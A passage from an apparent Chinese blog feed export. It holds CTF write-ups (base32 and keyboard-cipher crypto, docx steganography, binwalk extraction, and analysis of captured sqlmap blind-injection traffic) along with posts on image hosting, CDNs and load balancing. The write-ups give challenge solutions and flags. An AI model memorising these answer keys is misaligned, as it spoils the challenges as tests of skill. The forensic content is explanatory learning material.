title="运行结果"></a>运行结果</h2><p>flag{ALP5ALAB}</p><hr><h1 id="题目七"><a href="#题目七" class="headerlink" title="题目七"></a>题目七</h1><h2 id="base-家族"><a href="#base-家族" class="headerlink" title="base 家族"></a>base 家族</h2><p>题目描述：<br>我喜欢贝丝，但是贝丝的表妹喜欢我 还给了我一封情诗<br>MZWGCZ33MVZGQZLJL5STQOJTGRPWK4SVJ56Q&#x3D;&#x3D;&#x3D;&#x3D;</p><h2 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h2><p>根据密文中最后的等号个数可以判断属于 base32 编码，编码原理与 base64 类似，使用 base64 模块中的 base32 解码函数进行解码即可；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#调用base64模块的函数实现</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b32_de</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    <span class="keyword">import</span> base64</span><br><span class="line">    result = base64.b32decode(ciphertext)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"><span class="built_in">print</span>(b32_de(<span class="string">&#x27;MZWGCZ33MVZGQZLJL5STQOJTGRPWK4SVJ56Q====&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#不调用base64模块函数实现</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b32_decode</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    <span class="comment">#创建b32编码表</span></span><br><span class="line">    b32_word_list = &#123;</span><br><span class="line">        <span class="string">&#x27;A&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;B&#x27;</span>: <span class="number">1</span>, <span class="string">&#x27;C&#x27;</span>: <span class="number">2</span>,</span><br><span class="line">        <span class="string">&#x27;D&#x27;</span>: <span class="number">3</span>, <span class="string">&#x27;E&#x27;</span>: <span class="number">4</span>, <span class="string">&#x27;F&#x27;</span>: <span class="number">5</span>,</span><br><span class="line">        <span class="string">&#x27;G&#x27;</span>: <span class="number">6</span>, <span class="string">&#x27;H&#x27;</span>: <span class="number">7</span>, <span class="string">&#x27;I&#x27;</span>: <span class="number">8</span>,</span><br><span class="line">        <span class="string">&#x27;J&#x27;</span>: <span class="number">9</span>, <span class="string">&#x27;K&#x27;</span>: <span class="number">10</span>, <span class="string">&#x27;L&#x27;</span>: <span class="number">11</span>,</span><br><span class="line">        <span class="string">&#x27;M&#x27;</span>: <span class="number">12</span>, <span class="string">&#x27;N&#x27;</span>: <span class="number">13</span>, <span class="string">&#x27;O&#x27;</span>: <span class="number">14</span>,</span><br><span class="line">        <span class="string">&#x27;P&#x27;</span>: <span class="number">15</span>, <span class="string">&#x27;Q&#x27;</span>: <span class="number">16</span>, <span class="string">&#x27;R&#x27;</span>: <span class="number">17</span>,</span><br><span class="line">        <span class="string">&#x27;S&#x27;</span>: <span class="number">18</span>, <span class="string">&#x27;T&#x27;</span>: <span class="number">19</span>, <span class="string">&#x27;U&#x27;</span>: <span class="number">20</span>,</span><br><span class="line">        <span class="string">&#x27;V&#x27;</span>: <span class="number">21</span>, <span class="string">&#x27;W&#x27;</span>: <span class="number">22</span>, <span class="string">&#x27;X&#x27;</span>: <span class="number">23</span>,</span><br><span class="line">        <span class="string">&#x27;Y&#x27;</span>: <span class="number">24</span>, <span class="string">&#x27;Z&#x27;</span>: <span class="number">25</span>, <span class="string">&#x27;2&#x27;</span>: <span class="number">26</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span>: <span class="number">27</span>, <span class="string">&#x27;4&#x27;</span>: <span class="number">28</span>, <span class="string">&#x27;5&#x27;</span>: <span class="number">29</span>,</span><br><span class="line">        <span class="string">&#x27;6&#x27;</span>: <span class="number">30</span>, <span class="string">&#x27;7&#x27;</span>: <span class="number">31</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#获取二进制编码</span></span><br><span class="line">    binary = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(ciphertext)):</span><br><span class="line">        <span class="keyword">if</span> ciphertext[i] == <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            binary += <span class="string">&#x27;&#123;0:05b&#125;&#x27;</span>.<span class="built_in">format</span>(b32_word_list[ciphertext[i]])</span><br><span class="line">    <span class="comment">#获取结果</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        binary = binary[:<span class="built_in">len</span>(binary)-<span class="built_in">len</span>(binary) % <span class="number">8</span>]</span><br><span class="line">    <span class="keyword">while</span> i &lt; <span class="built_in">len</span>(binary):</span><br><span class="line">        ascii_value = <span class="built_in">int</span>(binary[i:i+<span class="number">8</span>], base=<span class="number">2</span>)</span><br><span class="line">        result += <span class="built_in">chr</span>(ascii_value)</span><br><span class="line">        i += <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><h2 id="运行结果-6"><a href="#运行结果-6" class="headerlink" title="运行结果"></a>运行结果</h2><p>flag{erhei_e8934_erUO}</p><hr><h1 id="题目八"><a href="#题目八" class="headerlink" title="题目八"></a>题目八</h1><h2 id="敲击"><a href="#敲击" class="headerlink" title="敲击"></a>敲击</h2><p>题目描述：<br>方方格格，不断敲击 “wdvtdz qsxdr werdzxc esxcfr uygbn“</p><h2 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li><p>根据题目描述，联想到 26 键键盘，通过密文中字母在键盘中的位置可以得出相对应的字母明文；</p><p>脑洞是真的大呀！</p></li></ol><h2 id="运行结果-7"><a href="#运行结果-7" class="headerlink" title="运行结果"></a>运行结果</h2><p>flag{x v z o c}</p>]]></content>
      
      
      <categories>
          
          <category> 大学生涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第三届网络空间安全挑战赛-Misc</title>
      <link href="/posts/3405.html"/>
      <url>/posts/3405.html</url>
      <cover>https://www.freeimg.cn/i/2023/11/03/6544dade56188.jpg</cover>
      <date>Sat Oct 28 2023 00:33:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="纯黑的噩梦"><a href="#纯黑的噩梦" class="headerlink" title="纯黑的噩梦"></a>纯黑的噩梦</h3><p>100分<br>打开发现有很多很多张黑色图片，要求找到正确的那张，里面是flag<img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Misc/%E7%BA%AF%E9%BB%91%E7%9A%84%E5%99%A9%E6%A2%A6.png" alt="小黑子"><br>考察docx本质是压缩包，将后缀改为.zip后解压即可找到图⽚<br><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Misc/docx%E9%9A%90%E5%86%99.png" alt="docx隐写"><br>我当时做的时候第一时间没想到改后缀，还是按部就班地用foremost分解docx文件，也可以得到一个压缩包，在压缩包中&#x2F;00000000&#x2F;word&#x2F;media&#x2F;路径下同样存在含有flag的图片。</p><h2 id="踩踩我的图"><a href="#踩踩我的图" class="headerlink" title="踩踩我的图"></a>踩踩我的图</h2><p>⾸先是图片隐写题常见思路，binwalk⼀下，当然也可以foremost，使用发现里面果然有秘密</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">binwalk -e file</span><br></pre></td></tr></table></figure><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Misc/%E8%B8%A9%E8%B8%A9%E6%88%91%E7%9A%84%E5%9B%BE.png" alt="踩1"></p><p>根据题目文件夹名与提⽰，搜索Picsel关键词，发现符合 “合二为一” 和 “军用级加密” 的软件为SSuite Picsel Security<br>下载软件并合并两图片得到flag</p><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Misc/%E8%B8%A92.png" alt="踩2"></p><p>我当时做的时候想到的是盲水印隐写问题，思路偏了qwq</p><h2 id="Ezpcapng"><a href="#Ezpcapng" class="headerlink" title="Ezpcapng"></a>Ezpcapng</h2><p>pcapng⽂件，⽤wireshark打开，发现显⽬的GET &#x2F;tmp&#x2F;sql&#x2F;sql4.php HTTP&#x2F;1.1 条⽬</p><p>随后意识到该流量包为sqlmap进⾏⽹站注⼊尝试的流量，进⼊TCP流追踪http协议发现很多条注⼊记录，考虑是sql盲注</p><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Misc/clip_image001.jpg" alt="img"></p><p>前面是一些猜解库名、表名等的注⼊，找到猜解flag的注⼊起点</p><p><img src="/img/%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%BD%91%E8%AE%A1-Misc/clip_image002.jpg" alt="img"></p><p>ASCII码值为102的字符为f，向下检查，四个字符为flag，就是这⾥没错，接着向下查找，列写出最终flag</p><p>这道题只要能看出是在用 sqlmap盲注就可以破解</p>]]></content>
      
      
      <categories>
          
          <category> 夺旗赛 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的图床方案 持续更新......</title>
      <link href="/posts/6a3f672a.html"/>
      <url>/posts/6a3f672a.html</url>
      <cover>https://www.freeimg.cn/i/2024/01/08/659c16ce217f9.png</cover>
      <date>Wed Oct 11 2023 00:00:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>我会在这里记录我的图床方案，发现好用的也会及时推送给大家，尽可能推荐免费的。<br>稳定的方案肯定是要结合云存储的，当然也可以是免费图床也可以是值得信赖的低价图床。对于没有服务器的同学，我目前比较推荐使用的是：</p><ul><li>免费图床：<a href="https://www.freeimg.cn/">Freeimg图床</a></li><li>付费图床：<a href="https://image.anheyu.com/">安知鱼图床</a>和杜老师的<a href="https://7bu.top/">去不图床</a></li></ul><p>这些图床其实都是基于国人开发的<a href="https://www.lsky.pro/">兰空图床</a>项目搭建的，有服务器的同学可以试试。</p><h2 id="使用并已推荐"><a href="#使用并已推荐" class="headerlink" title="使用并已推荐"></a>使用并已推荐</h2><p><a href="https://blog.xxfer.cn/posts/518ec1ac.html">Freeimg免费图床</a><br><a href="https://blog.xxfer.cn/posts/92211228.html">jsDelivr免费图床</a><br><a href="https://blog.xxfer.cn/posts/4c41eeca.html">自建Picsur图床</a></p><h2 id="图床使用历程"><a href="#图床使用历程" class="headerlink" title="图床使用历程"></a>图床使用历程</h2><div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2023</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>10-11</p></div></div><div class='timeline-item-content'><p><strong>Freeimg图床</strong><br>因为用量不大，所以直接使用网上的免费图床<a href="https://www.freeimg.cn/">Freeimg图床</a></p></div></div></div><div class="timeline purple"><div class='timeline-item headline'><div class='timeline-item-title'><div class='item-circle'><p>2024</p></div></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-08</p></div></div><div class='timeline-item-content'><p><strong>Freeimg图床+jsDelivr图床</strong><br>图片有点多了，而且考虑到Freeimg图床迁移不太方便，所以创建了jsDelivr图床分担一些图片到GitHub里面，方便管理。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-10</p></div></div><div class='timeline-item-content'><p><strong>Freeimg图床+jsDelivr图床+npm图床</strong><br>Freeimg图床存放封面等网站图片，jsDelivr和npm图床存放文章所需图片。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-13</p></div></div><div class='timeline-item-content'><p><strong>Freeimg图床</strong><br>Freeimg图床作为主要图床，jsDelivr和npm图床由于访问不稳定，作为备用方案。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>01-16</p></div></div><div class='timeline-item-content'><p><strong>Freeimg图床+Picsur图床</strong><br>Freeimg图床存放封面等网站图片，自建的Picsur图床存放文章所需图片，jsDelivr和npm图床由于访问不稳定，作为备用方案。</p></div></div><div class='timeline-item'><div class='timeline-item-title'><div class='item-circle'><p>03-12</p></div></div><div class='timeline-item-content'><p><strong>Freeimg图床+Picsur图床</strong><br>Freeimg图床存放封面等网站图片，自建的Picsur图床存放文章所需图片，jsDelivr和npm图床由于访问不稳定，作为备用方案。<br>最近看到有人用<strong>b站搭建图床</strong>的，这个应该和用qq当图床差不多吧，到时候可以试试，不过肯定是不够稳定的，也可以当作备用方案吧，感兴趣的同学可以去试试。</p></div></div></div><p>感觉图床暂时告一段落，博客封面啥的就放在Freeimg图床上，毕竟有2个GB，够我造好长时间了，文章所需图片放在Picsur图床就行。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/26/658a8a208cbe9.jpg" alt="等待更新......" style="width:360px;"/></div></div>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
            <tag> 自建应用项目 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CDN简介，推荐一些国内可用的CDN</title>
      <link href="/posts/992dd5ba.html"/>
      <url>/posts/992dd5ba.html</url>
      <cover>https://www.freeimg.cn/i/2023/12/27/658bf82f4e6d3.png</cover>
      <date>Fri Oct 06 2023 12:16:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="什么是-CDN？"><a href="#什么是-CDN？" class="headerlink" title="什么是 CDN？"></a>什么是 CDN？</h2><p>自CDN出现以来，它每天都在为我们提供便利。刷短视频、上网课、浏览网页等其实都用到了CDN。那么，到底什么是CDN？</p><p>CDN全称为Content Delivery Network，是一种由分布在不同区域的边缘节点服务器群组成的分布式网络。我们来看一个例子帮助理解吧。</p><p>就拿使用某APP追剧为例，同一时间有近一千万的用户使用一个APP追同一部剧，而且如果大家观看的是1080p 清晰度的视频（理论上需要4Mbps带宽），那么，累计需要的流量带宽是10,000,000×4Mbps&#x3D;40,000,000Mbps&#x3D;40Tbps。</p><p>我想这对于任何一家视频内容提供商来说都是巨大的流量吧。而且我们使用的计算机网卡，一般是1Gbps的带宽。根据上面的带宽可以得出，这家APP的供应商需要一台“超级服务器”才能满足这么大的流量需求。大厂也许真的能够提供，可是对于一些实力不太行的供应商该怎么办？使用“超级服务器”显然不现实。如果不能解决这样大的流量压力，势必会引起网络拥塞和访问时延，这对于运营商来说就意味着用户的流失，也就意味金钱的流失。</p><p>基于上面这样的需求，CDN技术的出现，解决了时延等问题。</p><h2 id="CDN-工作原理"><a href="#CDN-工作原理" class="headerlink" title="CDN 工作原理"></a>CDN 工作原理</h2><p>其实也并不复杂，CDN最初的核心理念就是将内容缓存在终端用户附近，实现资源的快速访问。</p><p>具体来说，CDN就是采用更多的缓存服务器（CDN边缘节点），布放在用户访问相对集中的地区或网络中。当用户访问网站时，利用全局负载技术，将用户的访问指向距离最近的缓存服务器上，由缓存服务器响应用户请求。</p><p>读到这里，大家也许会联想到镜像服务器。只能说两者有类似之处，但又并不完全相同。镜像服务器是源内容服务器的完整复制。而CDN，是部分内容的缓存，智能程度更高。<br>确切地说，CDN&#x3D;更智能的镜像+缓存+流量导流。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/27/658c1eb0650b8.png" alt="与传统结构的区别" style="width:750px;"/></div></div><p>与传统访问方式不同，CDN网络则是在用户和服务器之间增加缓存层，将用户的访问请求引导到最优的缓存节点而不是服务器源站点，从而加速访问速度。<br>将源站的资源缓存到位于全国各地的CDN节点上，用户请求资源时，就近返回节点上缓存的资源，而不需要每个用户的请求都回您的源站获取，避免网络拥塞、分担源站压力，保证用户访问资源的速度和体验。</p><h2 id="为什么要使用-CDN？"><a href="#为什么要使用-CDN？" class="headerlink" title="为什么要使用 CDN？"></a>为什么要使用 CDN？</h2><ol><li><p>为了加速网站的访问（这是最主要的目的）</p></li><li><p>为了实现跨运营商、跨地域的全网覆盖</p><p>互联不互通、区域ISP地域局限、出口带宽受限制等种种因素都造成了网站的区域性无法访问。CDN加速可以覆盖全球的线路，通过和运营商合作，部署IDC资源，在全国骨干节点商，合理部署CDN边缘分发存储节点，充分利用带宽资源，平衡源站流量。</p></li><li><p>为了保障你的网站安全</p><p>CDN的负载均衡和分布式存储技术，可以加强网站的可靠性，相当无无形中给你的网站添加了一把保护伞，应对绝大部分的互联网攻击事件。防攻击系统也能避免网站遭到恶意攻击。除此之外，使用CDN能够相对隐藏源服务器的地址。<br>那源服务器安全了，那么CDN服务器咋办呢？CDN服务商肯定考虑到了，最简单的处理方式就是负载均衡，如果在CDN网络中监测到有一台CDN服务器超载了，就会切断这台服务器的服务，转到另一台没有超载的CDN服务器上。那如何把流量进行转移？这里就涉及任播的知识，不再展开，感兴趣的同学自行学习。</p></li><li><p>为了异地备援</p><p>当某个服务器发生意外故障时，系统将会调用其他临近的健康服务器节点进行服务，进而提供接近100%的可靠性，这就让你的网站可以做到永不宕机。</p></li></ol><h2 id="CDN-相关概念"><a href="#CDN-相关概念" class="headerlink" title="CDN 相关概念"></a>CDN 相关概念</h2><ul><li><p>DNS域名解析，可以参考<a href="https://blog.xxfer.cn/posts/105a31a4.html">DNS域名解析的底层逻辑描述</a></p></li><li><p>CDN 回源 host</p></li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/26/658a8a208cbe9.jpg" alt="等待更新......" style="width:360px;"/></div></div><ul><li>SCDN</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/26/658a8a208cbe9.jpg" alt="等待更新......" style="width:360px;"/></div></div><ul><li>DCDN</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/26/658a8a208cbe9.jpg" alt="等待更新......" style="width:360px;"/></div></div><ul><li>PCDN</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/26/658a8a208cbe9.jpg" alt="等待更新......" style="width:360px;"/></div></div><h2 id="安全性和可靠性"><a href="#安全性和可靠性" class="headerlink" title="安全性和可靠性"></a>安全性和可靠性</h2><p>上文也讲到了虽然通过CDN能够在一定程度上隐藏源服务器地址，避免受到攻击，但是CDN服务器该怎么办？要知道如果想要开发者通过代码给资源指定多个地址是件很麻烦的事情。其实CDN服务商采用的方法和DNS域名解析里根服务器的做法有异曲同工之妙，那就是任播技术。具体请看<a href="https://blog.xxfer.cn/posts/105a31a4.html">DNS域名解析的底层逻辑描述</a>和<a href="https://blog.xxfer.cn/posts/3f3de275.html">云服务商是如何保障服务的安全性和可靠性的？</a>。总之使用了任播技术，服务器对外都拥有同一个IP地址，当这个IP接收到请求时，请求就会由距离用户最近的服务器来响应。因此，普通的DDOS攻击就能通过这种方式得到缓解，当然还是会有一定影响。</p><h2 id="国内CDN-npm镜像推荐"><a href="#国内CDN-npm镜像推荐" class="headerlink" title="国内CDN&#x2F;npm镜像推荐"></a>国内CDN&#x2F;npm镜像推荐</h2><p><strong>使用前提：域名备案</strong>，这是因为使用国内主机或服务器建站，根据相关政策要求，域名必须有对应的备案号。如果使用香港主机或海外主机，可以免备案。这是政策规定，那就必须执行。</p><p>关于域名备案的流程大家可以参考各自域名注册商的官方文档，或者参考各自服务器提供商的官方文档。下面是国内两大云服务商的官方文档入口，仅供参考，因为国内国外有很多途径能注册到域名。<br><a href="https://help.aliyun.com/zh/icp-filing/">阿里云ICP备案</a>、<a href="https://cloud.tencent.com/document/product/243/18914">腾讯云</a></p><ul><li><p>jsDelivr<br><a href="https://cdn.jsdelivr.net/">https://cdn.jsdelivr.net/</a></p></li><li><p>unpkg<br><a href="https://unpkg.com/">https://unpkg.com/</a></p></li><li><p>npm element<br><a href="http://npm.elemecdn.com/">http://npm.elemecdn.com/</a></p></li><li><p>初七云<br><a href="https://cdn.chuqis.com/npm">https://cdn.chuqis.com/npm</a><br><a href="https://cdn.chuqis.com/gh">https://cdn.chuqis.com/gh</a></p></li><li><p>bootcdn<br><a href="https://www.bootcdn.cn/">https://www.bootcdn.cn/</a></p></li><li><p>loli （cdnjs）<br><a href="https://cdnjs.loli.net/">https://cdnjs.loli.net/</a></p></li><li><p>Staticfile<br><a href="https://staticfile.org/">https://staticfile.org/</a></p></li><li><p>75CDN<br><a href="https://cdn.baomitu.com/">https://cdn.baomitu.com/</a></p></li><li><p>今日头条 CDN<br><a href="https://cdn.bytedance.com/">https://cdn.bytedance.com/</a></p></li><li><p>cdnjs<br><a href="https://cdnjs.com/">https://cdnjs.com/</a></p></li></ul><h2 id="我的CDN方案"><a href="#我的CDN方案" class="headerlink" title="我的CDN方案"></a>我的CDN方案</h2><p>建议大家使用CDN之前，一定要学习研究一下CDN。<strong>千万不要轻易使用CDN，以免带来不必要的损失</strong></p><p>CDN虽然能够给网站加速，但是有一些事项是需要我们注意的。相信大家都听过一些博主的网站被恶意刷流量，导致损失几百甚至上万。所以尽管我的网站访问量不多，也应该做好应对恶意刷流量的措施。</p><p>关于我的CDN方案，请继续观看这篇<a href="https://blog.xxfer.cn/posts/7c372084.html">小李的CDN使用与防护方案</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 网络安全 </tag>
            
            <tag> 博客 </tag>
            
            <tag> CDN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云服务商是如何保障服务的安全性和可靠性的？</title>
      <link href="/posts/3f3de275.html"/>
      <url>/posts/3f3de275.html</url>
      <cover>https://www.freeimg.cn/i/2023/12/30/65900f22262aa.jpg</cover>
      <date>Mon Oct 02 2023 10:16:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="大型网站面临的挑战"><a href="#大型网站面临的挑战" class="headerlink" title="大型网站面临的挑战"></a>大型网站面临的挑战</h2><p>大型网站都要面对庞大的用户量，高并发，海量数据等挑战。为了提升系统整体的性能，可以采用垂直扩展和水平扩展两种方式。</p><ul><li><p>垂直扩展：在网站发展早期，可以从单机的角度通过增加硬件处理能力，比如 CPU 处理能力，内存容量，磁盘等方面，实现服务器处理能力的提升。但是，单机是有性能瓶颈的，一旦触及瓶颈，再想提升，付出的成本和代价会极高。这显然不能满足大型分布式系统（网站）所有应对的大流量，高并发，海量数据等挑战。</p></li><li><p>水平扩展：通过集群来分担大型网站的流量。集群中的应用服务器（节点）通常被设计成无状态，用户可以请求任何一个节点，这些节点共同分担访问压力。水平扩展有两个要点：</p><ol><li>应用集群：将同一应用部署到多台机器上，组成处理集群，接收负载均衡设备分发的请求，进行处理，并返回相应数据。</li><li>负载均衡：将用户访问请求，通过某种算法，分发到集群中的节点。</li></ol></li></ul><h2 id="什么是负载均衡？"><a href="#什么是负载均衡？" class="headerlink" title="什么是负载均衡？"></a>什么是负载均衡？</h2><p>负载均衡（Load Balance，简称 LB）是高并发、高可用系统必不可少的关键组件，目标是尽力将网络流量平均分发到多个服务器上，以提高系统整体的响应速度和可用性。</p><p>负载均衡的主要作用如下：</p><ol><li>高并发：负载均衡通过算法调整负载，尽力均匀的分配应用集群中各节点的工作量，以此提高应用集群的并发处理能力（吞吐量）。</li><li>伸缩性：添加或减少服务器数量，然后由负载均衡进行分发控制。这使得应用集群具备伸缩性。</li><li>高可用：负载均衡器可以监控候选服务器，当服务器不可用时，自动跳过，将请求分发给可用的服务器。这使得应用集群具备高可用的特性。</li><li>安全防护：有些负载均衡软件或硬件提供了安全性功能，如：黑白名单处理、防火墙，防 DDos 攻击等。</li></ol><h2 id="负载均衡的分类"><a href="#负载均衡的分类" class="headerlink" title="负载均衡的分类"></a>负载均衡的分类</h2><h3 id="载体维度分类"><a href="#载体维度分类" class="headerlink" title="载体维度分类"></a>载体维度分类</h3><p>从支持负载均衡的载体来看，可以将负载均衡分为两类：硬件负载均衡、软件负载均衡。</p><h4 id="硬件负载均衡"><a href="#硬件负载均衡" class="headerlink" title="硬件负载均衡"></a>硬件负载均衡</h4><p>硬件负载均衡，一般是在定制处理器上运行的独立负载均衡服务器，价格昂贵，土豪专属。硬件负载均衡的主流产品有:F5 和 A10。</p><p>优点：</p><ul><li>功能强大：支持全局负载均衡并提供较全面的、复杂的负载均衡算法。</li><li>性能强悍：硬件负载均衡由于是在专用处理器上运行，因此吞吐量大，可支持单机百万以上的并发。</li><li>安全性高：往往具备防火墙，防 DDos 攻击等安全功能。</li></ul><p>缺点：</p><ul><li>成本昂贵：购买和维护硬件负载均衡的成本都很高。</li><li>扩展性差：当访问量突增时，超过限度不能动态扩容。</li></ul><h4 id="软件负载均衡"><a href="#软件负载均衡" class="headerlink" title="软件负载均衡"></a>软件负载均衡</h4><p>软件负载均衡，应用最广泛，无论大公司还是小公司都会使用。<br>软件负载均衡从软件层面实现负载均衡，一般可以在任何标准物理设备上运行。<br>软件负载均衡的 主流产品 有：Nginx、HAProxy、LVS。</p><p>优点：</p><ul><li>扩展性好：适应动态变化，可以通过添加软件负载均衡实例，动态扩展到超出初始容量的能力。</li><li>成本低廉：软件负载均衡可以在任何标准物理设备上运行，降低了购买和运维的成本。</li></ul><p>缺点：</p><ul><li>性能略差：相比于硬件负载均衡，软件负载均衡的性能要略低一些。</li></ul><h3 id="网络通信分类"><a href="#网络通信分类" class="headerlink" title="网络通信分类"></a>网络通信分类</h3><p>软件负载均衡从通信层面来看，又可以分为四层和七层负载均衡。</p><ol><li><p>七层负载均衡</p><p>可以根据访问用户的 HTTP 请求头、URL 信息将请求转发到特定的主机。</p><ul><li>DNS 重定向</li><li>HTTP 重定向</li><li>反向代理</li></ul></li><li><p>四层负载均衡</p><p>基于 IP 地址和端口进行请求的转发。</p><ul><li>修改 IP 地址</li><li>修改 MAC 地址</li></ul></li></ol><h4 id="DNS-负载均衡"><a href="#DNS-负载均衡" class="headerlink" title="DNS 负载均衡"></a>DNS 负载均衡</h4><p>DNS 负载均衡一般用于互联网公司，复杂的业务系统不适合使用。大型网站一般使用 DNS 负载均衡作为 第一级负载均衡手段，然后在内部使用其它方式做第二级负载均衡。DNS 负载均衡属于七层负载均衡。</p><p>DNS 即 域名解析服务，是 OSI 第七层网络协议。DNS 被设计为一个树形结构的分布式应用，自上而下依次为：根域名服务器，一级域名服务器，二级域名服务器，… ，本地域名服务器。显然，如果所有数据都存储在根域名服务器，那么 DNS 查询的负载和开销会非常庞大。</p><p>因此，DNS 查询相对于 DNS 层级结构，是一个逆向的递归流程，DNS 客户端依次请求本地 DNS 服务器，上一级 DNS 服务器，上上一级 DNS 服务器，… ，根 DNS 服务器（又叫权威 DNS 服务器），一旦命中，立即返回。为了减少查询次数，每一级 DNS 服务器都会设置 DNS 查询缓存。</p><p>DNS 负载均衡的工作原理就是：基于 DNS 查询缓存，按照负载情况返回不同服务器的 IP 地址。</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2023/12/30/6590133f5cc85.jpg" style="width:800px;"/></div></div><p>DNS 重定向的优点：</p><ul><li>使用简单：负载均衡工作，交给 DNS 服务器处理，省掉了负载均衡服务器维护的麻烦</li><li>提高性能：可以支持基于地址的域名解析，解析成距离用户最近的服务器地址（类似 CDN 的原理），可以加快访问速度，改善性能</li></ul><p>DNS 重定向的缺点：</p><ul><li>可用性差：DNS 解析是多级解析，新增&#x2F;修改 DNS 后，解析时间较长；解析过程中，用户访问网站将失败；</li><li>扩展性低：DNS 负载均衡的控制权在域名商那里，无法对其做更多的改善和扩展；</li><li>维护性差：也不能反映服务器的当前运行状态；支持的算法少；不能区分服务器的差异（不能根据系统与服务的状态来判断负载）</li></ul><h4 id="HTTP-负载均衡"><a href="#HTTP-负载均衡" class="headerlink" title="HTTP 负载均衡"></a>HTTP 负载均衡</h4><p>HTTP 负载均衡是基于 HTTP 重定向实现的。HTTP 负载均衡属于七层负载均衡。</p><p>HTTP 重定向原理是：根据用户的 HTTP 请求计算出一个真实的服务器地址，将该服务器地址写入 HTTP 重定向响应中，返回给浏览器，由浏览器重新进行访问。</p><div class="img-wrap"><div class="img-bg"><img class="img" 